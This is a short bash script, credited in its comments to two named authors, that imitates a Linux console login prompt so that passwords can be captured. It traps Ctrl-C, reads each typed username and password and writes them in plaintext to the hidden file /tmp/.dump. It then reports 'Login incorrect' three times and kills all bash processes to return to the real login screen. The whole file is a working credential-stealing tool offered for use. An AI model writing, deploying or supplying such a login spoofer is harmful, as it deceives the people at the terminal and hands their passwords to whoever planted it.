# Made by Pranav Joshi & Deepak Kaul 
# joshipranav [at the rate] gmail [dot] com
# 
# Bash script to emulate login prompt for Linux Machines.. 
#
# Ctrl-C is blocked
# entered passwords are saved to /tmp/.dump 
# 
# this script kills all bash instances after it's execution and 
# returns to the main login prompt so be prepared before u run it


#!/bin/bash
clear

#Uncomment if you want to erase the /tmp/dump file each time 
#> /tmp/.dump

#Your Login BANNER
BANNER='Ubuntu 5.10 "Breezy Badger" PTbuntu tty1'

#HOSTNAME
HN=PTuntu

#RUN Set to 0
RUN=0

echo $BANNER 
echo 
while [ $RUN -lt 3 ]
do 
	echo -n $HN login:; trap "" SIGINT SIGTERM; read USER 
	
	if [ ${USER}abc = abc ]
	   then
		echo $BANNER
		echo
		continue 
        else
	   echo username is $USER >> /tmp/.dump
	   echo -n Password: ; read -s PSWD 

	   if [ ${PSWD}abc = abc ]
	      then
	      echo ; echo ; continue
	   fi
           
	   echo password is $PSWD >> /tmp/.dump ; echo 
	fi 
	echo Login incorrect
echo 
RUN=`expr $RUN + 1` 
done

# Registers the PID of first instance of bash
#BPID=`ps u | tr -s " " ":" | grep  [-]bash | head -n1 | cut -d":" -f2` 

# Registers PIDs of all bash instances (Safer)
BPID=`ps u | tr -s " " ":" | grep  bash | cut -d":" -f2` 

sleep 1
kill -9 $BPID
